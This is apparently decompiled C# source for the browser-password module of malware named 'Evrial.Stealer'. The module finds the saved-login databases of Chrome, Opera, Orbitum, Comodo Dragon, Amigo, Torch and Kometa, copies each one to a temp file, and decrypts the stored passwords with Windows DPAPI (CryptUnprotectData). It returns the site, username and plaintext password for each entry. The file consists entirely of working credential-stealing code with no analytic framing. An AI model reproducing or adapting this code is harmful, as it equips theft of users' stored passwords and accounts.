using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Evrial.Stealer
{
	// Token: 0x0200000A RID: 10
	public static class Chromium
	{
		// Token: 0x06000017 RID: 23 RVA: 0x00002590 File Offset: 0x00000790
		public static IEnumerable<PassData> Initialise()
		{
			List<PassData> list = new List<PassData>();
			string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
			string[] array = new string[]
			{
				environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Login Data",
				Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Login Data",
				environmentVariable + "\\Kometa\\User Data\\Default\\Login Data",
				environmentVariable + "\\Orbitum\\User Data\\Default\\Login Data",
				environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
				environmentVariable + "\\Amigo\\User\\User Data\\Default\\Login Data",
				environmentVariable + "\\Torch\\User Data\\Default\\Login Data"
			};
			foreach (string basePath in array)
			{
				List<PassData> list2 = new List<PassData>();
				try
				{
					list2 = Chromium.Get(basePath);
				}
				catch
				{
				}
				if (list2 != null)
				{
					list.AddRange(list2);
				}
			}
			return list;
		}

		// Token: 0x06000018 RID: 24
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Chromium.DataBlob pCipherText, ref string pszDescription, ref Chromium.DataBlob pEntropy, IntPtr pReserved, ref Chromium.CryptprotectPromptstruct pPrompt, int dwFlags, ref Chromium.DataBlob pPlainText);

		// Token: 0x06000019 RID: 25 RVA: 0x0000266C File Offset: 0x0000086C
		public static byte[] DecryptChromium(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			Chromium.DataBlob dataBlob = default(Chromium.DataBlob);
			Chromium.DataBlob dataBlob2 = default(Chromium.DataBlob);
			Chromium.DataBlob dataBlob3 = default(Chromium.DataBlob);
			Chromium.CryptprotectPromptstruct cryptprotectPromptstruct = new Chromium.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(Chromium.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch (Exception)
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch (Exception)
				{
				}
				Chromium.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch (Exception)
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002820 File Offset: 0x00000A20
		private static List<PassData> Get(string basePath)
		{
			if (!File.Exists(basePath))
			{
				return null;
			}
			string program = "";
			if (basePath.Contains("Chrome"))
			{
				program = "Google Chrome";
			}
			if (basePath.Contains("Yandex"))
			{
				program = "Yandex Browser";
			}
			if (basePath.Contains("Orbitum"))
			{
				program = "Orbitum Browser";
			}
			if (basePath.Contains("Opera"))
			{
				program = "Opera Browser";
			}
			if (basePath.Contains("Amigo"))
			{
				program = "Amigo Browser";
			}
			if (basePath.Contains("Torch"))
			{
				program = "Torch Browser";
			}
			if (basePath.Contains("Comodo"))
			{
				program = "Comodo Browser";
			}
			List<PassData> result;
			try
			{
				string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
				if (File.Exists(text))
				{
					File.Delete(text);
				}
				File.Copy(basePath, text, true);
				Sqlite sqlite = new Sqlite(text);
				List<PassData> list = new List<PassData>();
				sqlite.ReadTable("logins");
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					try
					{
						string text2 = string.Empty;
						try
						{
							byte[] bytes = Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 5)), null);
							text2 = Encoding.UTF8.GetString(bytes);
						}
						catch (Exception)
						{
						}
						if (text2 != "")
						{
							list.Add(new PassData
							{
								Url = sqlite.GetValue(i, 1).Replace("https://", "").Replace("http://", ""),
								Login = sqlite.GetValue(i, 3),
								Password = text2,
								Program = program
							});
						}
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.ToString());
					}
				}
				File.Delete(text);
				result = list;
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x0200000B RID: 11
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000015 RID: 21
			public int cbSize;

			// Token: 0x04000016 RID: 22
			public int dwPromptFlags;

			// Token: 0x04000017 RID: 23
			public IntPtr hwndApp;

			// Token: 0x04000018 RID: 24
			public string szPrompt;
		}

		// Token: 0x0200000C RID: 12
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000019 RID: 25
			public int cbData;

			// Token: 0x0400001A RID: 26
			public IntPtr pbData;
		}
	}
}
